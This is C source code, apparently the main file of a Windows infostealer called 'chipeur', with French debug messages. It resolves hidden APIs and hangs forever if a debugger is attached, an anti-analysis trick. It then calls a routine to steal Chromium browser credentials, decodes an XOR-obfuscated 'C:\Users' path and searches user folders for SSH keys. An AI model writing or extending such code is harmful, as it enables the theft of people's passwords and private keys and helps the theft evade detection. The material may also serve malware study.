#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>
#include <winnt.h>

#include "chromium.h"
#include "find_ssh_key.h"
#include "obfuscation.h"

int main(void) {
#ifdef DEBUG
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);
#endif

  // Init
  hidden_apis apis = {0};
  resolve_apis(&apis);

  // Check if a debugger is attached to the process
  BOOL isDebuggerPresent = FALSE;
  HANDLE hProcess = GetCurrentProcess();

  if (apis.funcCheckRemoteDebuggerPresent) {
    if (apis.funcCheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
      if (isDebuggerPresent) {
#ifdef DEBUG
        printf("Un débogueur est détecté sur ce processus.\n");
#endif
        while (1);
      } else {
#ifdef DEBUG
        printf("Aucun débogueur n'est détecté sur ce processus.\n");
#endif
      }
    } else {
#ifdef DEBUG
      printf(
          "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur "
          ": %lu\n",
          GetLastError());
#endif
    }
  } else {
#ifdef DEBUG
    printf(
        "Erreur: CheckRemoteDebuggerPresent n'a pas été résolu "
        "correctement.\n");
#endif
  }
  // char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
  // XOR_STR(msvcrt_str, strlen(msvcrt_str));
  // apis.funcLoadLibraryA(msvcrt_str);

  steal_chromium_creds();

  wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
  XOR_STR(users_path, 8);

  find_ssh_key(users_path);
  return EXIT_SUCCESS;
}
